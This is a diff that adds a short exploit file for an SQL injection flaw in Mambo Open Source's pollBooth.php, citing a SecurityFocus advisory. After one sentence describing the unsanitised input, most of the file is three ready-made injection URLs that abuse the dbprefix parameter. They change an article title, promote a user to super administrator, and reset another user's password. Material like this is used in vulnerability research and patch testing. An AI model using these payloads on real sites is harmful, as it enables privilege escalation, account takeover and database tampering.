@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/9197/info
+
+Mambo Open Source is prone to SQL injection attacks. This is due to an input validation error in 'pollBooth.php'. In particular, various user-supplied variables are used in an SQL query without proper sanitization of SQL syntax. As a result, a remote attacker could include malicious SQL syntax via URI parameters and influence database queries. 
+
+# The title of the article N?23 becomes "hop" :
+http://www.example.com/pollBooth.php?task=Vote&lang=eng&sessioncookie=1&
+voteID=1&dbprefix=mos_articles%20SET%20title=char(104,111,112)
+%20WHERE artid=23/*
+
+# The user having id 52 becomes "super administrator" :
+http://www.example.com/pollBooth.php?task=Vote&lang=eng&sessioncookie=1&
+voteID=1&dbprefix=mos_users%20SET%20usertype=char(115,117,
+112,101,114,97,100,109,105,110,105,115,116,114,97,116,111,114)
+%20WHERE%20id=52/*
+
+# The password of the user having id 10 becomes 'a' :
+http://www.example.com/pollBooth.php?task=Vote&lang=eng&sessioncookie=1&
+voteID=1&dbprefix=mos_users%20SET%20password=md5(char(97))
+%20WHERE%20id=10/* 
